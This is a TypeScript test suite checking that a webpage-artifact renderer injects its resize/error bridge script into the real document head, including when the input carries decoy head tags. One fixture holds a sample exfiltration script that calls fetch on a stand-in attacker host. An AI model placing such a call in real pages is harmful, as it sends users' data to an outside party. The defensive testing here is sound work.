import { buildArtifactDocument } from './WebpageRenderer';

function parse(srcDoc: string): Document {
    return new DOMParser().parseFromString(srcDoc, 'text/html');
}

function getBridgeScript(doc: Document): HTMLScriptElement | undefined {
    return Array.from(doc.head.querySelectorAll('script')).find((el) => el.textContent?.includes('lumo-resize'));
}

describe('buildArtifactDocument', () => {
    it('injects the resize/error bridge script into the real <head>, not a decoy comment that merely looks like one', () => {
        const html = `
<html>
<!-- <head> -->
<head></head>
<body>
<script>fetch('https://attacker.example/leak')</script>
</body>
</html>`;

        const doc = parse(buildArtifactDocument(html));

        expect(getBridgeScript(doc)).toBeDefined();

        // The decoy comment's literal text must be untouched — the fix should never treat it as markup.
        expect(doc.documentElement.outerHTML).toContain('<!-- <head> -->');
    });

    it('still injects the bridge script into a real (implied) head when the input has no <head> tag at all', () => {
        const html = '<body><p>hi</p></body>';

        const doc = parse(buildArtifactDocument(html));

        expect(getBridgeScript(doc)).toBeDefined();
    });

    it('does not mistake a <header> element for <head>', () => {
        const html = '<html><header>site header</header><head></head><body>content</body></html>';

        const doc = parse(buildArtifactDocument(html));

        expect(getBridgeScript(doc)).toBeDefined();
        expect(doc.querySelector('header')?.textContent).toBe('site header');
    });

    it('does not mistake head-like text inside a <script>/<style> block for a real head tag', () => {
        const html = `
<html>
<script>var s = "<head>oops</head>";</script>
<head></head>
<body>content</body>
</html>`;

        const doc = parse(buildArtifactDocument(html));

        expect(getBridgeScript(doc)).toBeDefined();
        const decoyScript = Array.from(doc.querySelectorAll('script')).find((el) => el.textContent?.includes('oops'));
        expect(decoyScript?.textContent).toBe('var s = "<head>oops</head>";');
    });

    it('preserves the artifact content end-to-end aside from the injected bridge script', () => {
        const html = `<html><head><style>body { color: red; }</style></head><body><h1>Hello</h1><script>console.log('hi')</script></body></html>`;

        const doc = parse(buildArtifactDocument(html));

        expect(doc.querySelector('style')?.textContent).toBe('body { color: red; }');
        expect(doc.querySelector('h1')?.textContent).toBe('Hello');
        expect(Array.from(doc.querySelectorAll('script')).some((el) => el.textContent?.includes('console.log'))).toBe(
            true
        );
    });

    it('preserves the doctype', () => {
        const html = '<!DOCTYPE html><html><head></head><body>hi</body></html>';

        const result = buildArtifactDocument(html);

        expect(result.toLowerCase().startsWith('<!doctype html>')).toBe(true);
    });

    it('no longer injects a CSP <meta> tag — the shell route now sets its own CSP response header', () => {
        const html = '<html><head></head><body>hi</body></html>';

        const doc = parse(buildArtifactDocument(html));

        expect(doc.head.querySelector('meta[http-equiv="Content-Security-Policy" i]')).toBeNull();
    });

    it('places the bridge script in <head>, ahead of body content', () => {
        const html = '<html><head></head><body><script>console.log("artifact script")</script></body></html>';

        const doc = parse(buildArtifactDocument(html));

        expect(getBridgeScript(doc)).toBeDefined();
    });
});
